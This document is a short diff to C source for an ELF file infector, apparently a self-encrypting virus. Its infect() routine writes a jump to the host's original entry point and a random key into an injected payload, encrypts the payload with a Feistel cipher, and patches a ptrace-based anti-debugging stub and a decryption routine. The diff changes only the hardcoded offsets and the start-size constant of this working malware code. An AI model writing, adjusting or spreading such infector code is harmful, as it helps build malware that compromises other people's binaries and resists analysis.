@@ -14,7 +14,7 @@
 
 static bool		parsing(byte *file, elf_data *data);
 
-#define _START_SIZE 0x152
+#define _START_SIZE 0x12c
 
 void manual_modif(uint8_t *ptrace, uint8_t *ptrace_end, uint8_t *decrypt) {
     while (ptrace < ptrace_end) { // While current_ptrace < end_ptrace
@@ -156,7 +156,7 @@ bool	infect(profiling *this, const str path) {
 
 	// Write jump to original entry point and jump to decrypt if we aren't the original
 	ft_memcpy(data.file + data.infection_offset_file + this->size - 16, (byte *)&new_jump, 4);
-	ft_memcpy(data.file + data.infection_offset_file + this->size - 315, (byte *)&zero, 4);
+	ft_memcpy(data.file + data.infection_offset_file + this->size - 277, (byte *)&zero, 4);
 
 	uint64_t key = generate_random_key();
 	if (key == 0) {
@@ -165,13 +165,13 @@ bool	infect(profiling *this, const str path) {
 	}
 
 	// Write the key
-	ft_memcpy(data.file + data.infection_offset_file + this->size - 182, (byte *)&key, 4);
+	ft_memcpy(data.file + data.infection_offset_file + this->size - 144, (byte *)&key, 4);
 
 	feistel_encrypt(data.file + data.infection_offset_file, this->size - _START_SIZE - 1, key);
 
-	byte *ptrace_start = data.file + data.infection_offset_file + this->size - 281;
-	byte *ptrace_end = data.file + data.infection_offset_file + this->size - 254;
-	byte *decrypt_start = data.file + data.infection_offset_file + this->size - 198;
+	byte *ptrace_start = data.file + data.infection_offset_file + this->size - 243;
+	byte *ptrace_end = data.file + data.infection_offset_file + this->size - 216;
+	byte *decrypt_start = data.file + data.infection_offset_file + this->size - 160;
 
 	manual_modif(ptrace_start, ptrace_end, decrypt_start);
 
